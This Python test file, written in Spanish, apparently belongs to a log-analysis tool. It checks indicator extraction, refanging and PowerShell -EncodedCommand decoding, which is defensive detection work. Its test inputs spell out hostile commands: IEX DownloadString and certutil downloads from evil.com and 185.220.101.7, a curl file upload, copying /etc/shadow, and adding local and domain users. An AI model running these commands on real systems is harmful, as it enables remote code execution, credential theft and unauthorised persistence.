"""
Indicadores: ruido que antes salía, formatos que antes no se extraían y lo
que esconde un `powershell -EncodedCommand`.
"""

import base64

import pytest

from app.modules.tracking import service
from app.modules.tracking.indicators import extraer_indicadores, refang
from app.modules.tracking.powershell import decodificar_encoded_command


def _pares(comando, salida=None):
    return {(i.tipo, i.valor) for i in extraer_indicadores(comando, salida)}


def _codificar(texto: str) -> str:
    return base64.b64encode(texto.encode("utf-16-le")).decode()


# --- ruido que ya no sale -----------------------------------------------------

@pytest.mark.parametrize(
    ("comando", "no_debe_salir"),
    [
        ("IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/a')", ("dominio", "system.net.webclient")),
        ("[System.IO.File]::WriteAllBytes('C:\\Users\\Public\\a.exe', $b)", ("dominio", "system.io.file")),
        ("python3 exploit.py 10.0.0.1 4444", ("dominio", "exploit.py")),
        ("[IO.File]::ReadAllBytes($p)", ("ip_privada", "::")),
        ("2026-08-14 03:11:19 ok", ("ip_privada", "03:11:19")),
    ],
)
def test_no_extrae_ruido(comando, no_debe_salir):
    assert no_debe_salir not in _pares(comando)


def test_la_url_real_sigue_saliendo_junto_al_tipo_dotnet():
    pares = _pares("IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/a')")
    assert ("url", "http://evil.com/a") in pares
    assert ("dominio", "evil.com") in pares


# --- formatos que antes no se extraían -------------------------------------

def test_ruta_entre_comillas_con_espacios():
    pares = _pares('copy "C:\\Program Files\\App\\conf.ini" \\\\10.0.0.5\\c$\\x')
    assert ("ruta", "C:\\Program Files\\App\\conf.ini") in pares
    assert ("ruta", "C:\\Program") not in pares


def test_ipv6_suelta_y_dentro_de_url():
    assert ("ip_publica", "2001:4860:4860::8888") in _pares("ping 2001:4860:4860::8888")
    pares = _pares("curl -F f=@/tmp/.x http://[2001:4860:4860::8844]/up")
    assert ("ip_publica", "2001:4860:4860::8844") in pares


def test_rutas_linux_y_con_variables():
    pares = _pares("cp /etc/shadow /tmp/.x && copy %TEMP%\\a.exe $env:APPDATA\\b.exe")
    assert {("ruta", "/etc/shadow"), ("ruta", "/tmp/.x"), ("ruta", "%TEMP%\\a.exe"), ("ruta", "$env:APPDATA\\b.exe")} <= pares


def test_los_parametros_de_windows_no_son_rutas_linux():
    pares = _pares("net user hacker /add /domain")
    assert not any(t == "ruta" for t, _ in pares)


def test_indicadores_desactivados():
    assert refang("hxxp://evil[.]com") == "http://evil.com"
    pares = _pares("hxxp://evil[.]com/a 185[.]220[.]101[.]7")
    assert ("url", "http://evil.com/a") in pares
    assert ("ip_publica", "185.220.101.7") in pares


@pytest.mark.parametrize(
    ("ip", "tipo"),
    [("185.220.101.7", "ip_publica"), ("100.64.1.1", "ip_privada"), ("203.0.113.9", "ip_privada"), ("10.0.0.1", "ip_privada")],
)
def test_clasificacion_de_ips(ip, tipo):
    assert (tipo, ip) in _pares(f"ping {ip}")


# --- -EncodedCommand ----------------------------------------------------------

OCULTO = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.7/a.ps1')"


@pytest.mark.parametrize("flag", ["-EncodedCommand", "-enc", "-e", "-ec", "/enc"])
def test_decodifica_encoded_command_y_sus_abreviaturas(flag):
    assert decodificar_encoded_command(f"powershell.exe -nop {flag} {_codificar(OCULTO)}") == OCULTO


@pytest.mark.parametrize(
    "comando",
    ["powershell -ExecutionPolicy Bypass -File a.ps1", "powershell -enc NoEsBase64!!", "cmd /c echo -enc SQBFAFgA"],
)
def test_no_decodifica_lo_que_no_es_encoded_command(comando):
    assert decodificar_encoded_command(comando) is None


def test_el_analisis_extrae_y_clasifica_lo_que_esconde_el_base64():
    oculto = "net user soporte P@ss1 /add; certutil -urlcache -f http://185.220.101.7/x.exe C:\\ProgramData\\x.exe"
    log = f"2026-08-14 03:11:19  powershell -w hidden -enc {_codificar(oculto)}\n"
    evento = service.analyze_log_content(log, "a.log").eventos[0]

    assert evento.comando_decodificado == oculto
    assert "descarga_con_binario_legitimo" in evento.reglas
    assert "cuenta_o_grupo_modificado" in evento.reglas
    origenes = {(i.tipo, i.valor): i.origen for i in evento.indicadores}
    assert origenes[("ip_publica", "185.220.101.7")] == "decodificado"
    assert origenes[("ruta", "C:\\ProgramData\\x.exe")] == "decodificado"
